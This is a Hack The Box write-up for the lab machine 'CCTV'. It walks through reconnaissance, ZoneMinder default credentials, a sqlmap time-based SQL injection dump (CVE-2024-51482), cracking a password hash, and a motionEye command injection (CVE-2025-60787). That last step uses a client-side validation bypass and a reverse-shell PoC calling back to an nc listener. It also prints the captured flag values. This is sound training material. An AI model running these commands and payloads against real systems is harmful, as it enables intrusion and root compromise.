# CCTV - HackTheBox Writeup

**Date:** 2026-03-20  
**OS:** Linux (Ubuntu)  
**IP Address:** 10.129.7.12  
**Difficulty:** Easy  

---

# 1. Executive Summary

CCTV is an Easy-difficulty Linux machine on Hack The Box that focuses on web application exploitation, credential extraction through SQL injection, and privilege escalation through a vulnerable CCTV management platform. The attack chain:

1. **Reconnaissance**: Nmap reveals port 22 (SSH) and port 80 (HTTP — SecureVision interface).
2. **ZoneMinder Discovery**: Directory enumeration exposes a ZoneMinder portal at `/zm/`, accessed via default credentials `admin:admin`.
3. **SQL Injection (CVE-2024-51482)**: Time-based blind SQL injection in the `tid` parameter allows dumping the `zm.Users` table via `sqlmap`, revealing bcrypt password hashes.
4. **Hash Cracking**: `john` cracks the `mark` user's hash to `opensesame`.
5. **Initial Access**: SSH login as `mark:opensesame`.
6. **Privilege Escalation (CVE-2025-60787)**: `motionEye` is running as root with its web interface on localhost:8765. SSH port forwarding exposes it, and a command injection vulnerability allows injecting a reverse shell payload, yielding a root shell.

---

# 2. Reconnaissance & Enumeration

## 2.1. Host Configuration

Add the target to `/etc/hosts` so virtual host routing works correctly:

```bash
echo "10.129.7.12 cctv.htb" | sudo tee -a /etc/hosts
```

## 2.2. Nmap Scan

A full TCP port scan to avoid missing any services, followed by a detailed service scan:

```bash
nmap -p- --min-rate 5000 -sS 10.129.7.12 -oN nmap/full_pn
nmap -p22,80 -sC -sV -oN nmap/initial 10.129.7.12
```

**Results:**

| Port | Service | Version |
| :--- | :--- | :--- |
| 22/tcp | SSH | OpenSSH 9.6p1 |
| 80/tcp | HTTP | Apache 2.4.58 — "SecureVision CCTV & Security Solutions" |

All other ports were filtered or closed. The primary attack surface is the web service on port 80.

## 2.3. Web Application Discovery

Browsing to `http://10.129.7.12` automatically redirects to `http://cctv.htb/`, presenting the "SecureVision" CCTV monitoring landing page. The page advertises surveillance services and has a "Staff Login" link.

Directory brute-force with `ffuf` revealed a ZoneMinder directory:

```bash
ffuf -u http://cctv.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -t 40
```

**Significant findings:**
- `/zm/` → ZoneMinder v1.37.63 surveillance management portal

Browsing to `http://cctv.htb/zm/` revealed the ZoneMinder login page. Default credentials worked immediately:

- **Username:** `admin`
- **Password:** `admin`

This granted access to the ZoneMinder administrative dashboard.

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Research — CVE-2024-51482 (ZoneMinder SQL Injection)

After gaining dashboard access, the installed version (ZoneMinder **v1.37.63**) was researched for known vulnerabilities. **CVE-2024-51482** was identified: a Boolean/time-based blind SQL injection in the `tid` parameter of ZoneMinder's web interface.

- **Endpoint:** `/zm/index.php?view=request&task=log&action=delete&tid=<INJECTION>`
- **Type:** Time-based blind SQL injection (MySQL backend)
- **Auth required:** Yes — a valid ZoneMinder session cookie must be supplied

## 3.2. Session Cookie Extraction

Since the endpoint requires an authenticated session, the `ZMSESSID` cookie was extracted from the browser after logging in:

1. Open **Developer Tools** (F12)
2. Navigate to **Storage → Cookies → http://cctv.htb**
3. Copy the value of the `ZMSESSID` cookie

## 3.3. Database Enumeration via sqlmap

With the session cookie in hand, `sqlmap` was used to extract the `zm.Users` table:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&task=log&action=delete&tid=1" \
  --cookie="ZMSESSID=<YOUR_SESSION_COOKIE>" \
  --dbms=mysql \
  -D zm -T Users -C Username,Password \
  --dump \
  --technique=T \
  --time-sec=2
```

> **Note:** Due to the time-based nature of the injection, extraction is slow and may generate many HTTP 500 responses. This is expected — sqlmap will still successfully reconstruct the data.

**Result — zm.Users table dump:**

| Username | Password (bcrypt) |
| :--- | :--- |
| superadmin | `$2y$10$...` |
| mark | `$2y$10$...` |
| admin | `$2y$10$...` |

## 3.4. Password Hash Cracking

The bcrypt hashes were saved to a file and cracked with `john` using `rockyou.txt`:

```bash
# Save the hashes
cat hashes.txt
# $2y$10$<mark_hash>

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** The hash for `mark` cracked to **`opensesame`**.

## 3.5. SSH Access as Mark

The cracked password was reused for SSH access:

```bash
ssh mark@cctv.htb
# Password: opensesame
```

Initial enumeration of Mark's home directory revealed `.bash_history` sym-linked to `/dev/null` (history logging disabled). The user flag is **not** in Mark's home directory.

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Post-Exploitation Enumeration — motionEye Service

Enumeration of running services revealed `motionEye` running as **root**:

```bash
cat /etc/systemd/system/motioneye.service
```

```
[Service]
User=root
ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
```

### Inspecting the motionEye Configuration

```bash
cat /etc/motioneye/motion.conf
```

Key findings:
- **Admin password hash** (SHA-1): `989c5a8ee87a0e9521ec81a79187d162109282f0`
- **Web interface** restricted to localhost: `webcontrol_localhost on` (port 8765)

### Inspecting Application Logs

```bash
cat /var/log/motioneye/motioneye.log
```

Logs showed repeated API interactions from a service account named `sa_mark`, performing `status` and `disk-info` queries against the motionEye API. This hinted that `sa_mark`'s home directory might hold the user flag.

## 4.2. Accessing motionEye via SSH Port Forwarding

Since the motionEye web interface only listens on localhost, SSH local port forwarding was used to expose it:

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

Now `http://127.0.0.1:8765` on the attacker machine routes to motionEye on the target.

### Authenticating to motionEye

Browsed to `http://127.0.0.1:8765`, logged in with:
- **Username:** `admin`
- **Password:** `opensesame` (the SHA-1 hash in the config corresponds to this password — same credential reuse)

This granted access to the motionEye administrative dashboard.

## 4.3. Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)

**CVE-2025-60787** affects motionEye ≤ 0.43.1b4. The `image_file_name` configuration parameter is written directly into the Motion configuration file without sanitization. When the Motion service reloads, shell metacharacters in the value are interpreted, enabling arbitrary command execution **as root**.

### Step 1: Bypass Client-Side Validation

The motionEye UI validates the `image_file_name` field via JavaScript, blocking special characters. Open the browser developer console (F12 → Console) and override the validation function:

```javascript
configUiValid = function() { return true; };
```

This forces validation to always pass, allowing injection of arbitrary values.

### Step 2: Prepare a Reverse Shell Listener

On the attacker machine:

```bash
nc -lvnp 1235
```

### Step 3: Execute the Exploit

The CVE-2025-60787 PoC script automates the injection:

```bash
cd exploits/CVE-2025-60787/

python3 CVE-2025-60787.py revshell \
  --url 'http://127.0.0.1:8765' \
  --user 'admin' \
  --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
  -i 10.10.15.67 \
  --port 1235
```

The script:
1. Authenticates to the motionEye API.
2. Enumerates available cameras.
3. Injects a reverse shell payload into the `image_file_name` field.
4. Triggers the Motion service to reload its config, executing the payload as root.

**Script output:**
```
[*] Valid credentials provided
[*] Found 1 camera(s)
    1) Name: 'CAM-PWN' ; ID: 1; root_directory: '/var/lib/motioneye/Camera1'
[*] Payload successfully injected. Check your shell...
~Happy Hacking
```

### Step 4: Obtain Root Shell

The `nc` listener receives the connection:

```
connect to [10.10.15.67] from (UNKNOWN) [10.129.7.12] 57192
whoami
root
```

## 4.4. Flag Retrieval

**Root flag:**
```bash
cat /root/root.txt
# 82e8401d1523a44effdef8042a7cf3de
```

**User flag** (found in `sa_mark`'s home directory):
```bash
ls /home
# mark  sa_mark
cat /home/sa_mark/user.txt
# 6336368c7ec3340bbdd46a26d76ec250
```

---

# 5. Credentials & Loot

| Username | Password | Source |
| :--- | :--- | :--- |
| admin (ZoneMinder) | admin | Default credentials |
| mark | opensesame | Cracked from zm.Users bcrypt hash |
| admin (motionEye) | opensesame / `989c5a8ee87a0e95...` | `/etc/motioneye/motion.conf` |

| Flag | Value | Location |
| :--- | :--- | :--- |
| user.txt | `6336368c7ec3340bbdd46a26d76ec250` | `/home/sa_mark/user.txt` |
| root.txt | `82e8401d1523a44effdef8042a7cf3de` | `/root/root.txt` |

---

# 6. Recommendations & Mitigation

1. **Change default credentials**: Never deploy ZoneMinder or motionEye with default `admin:admin` passwords.
2. **Patch ZoneMinder**: Update to a version patching CVE-2024-51482 to prevent SQL injection.
3. **Patch motionEye**: Update to a version patching CVE-2025-60787 to prevent command injection.
4. **Principle of Least Privilege**: Run monitoring services (`motionEye`, `zoneminder`) as dedicated, unprivileged service accounts — not as `root`.
5. **Strong password policy**: All hashed passwords should use modern algorithms (bcrypt/argon2) with a strong, unique password per service.
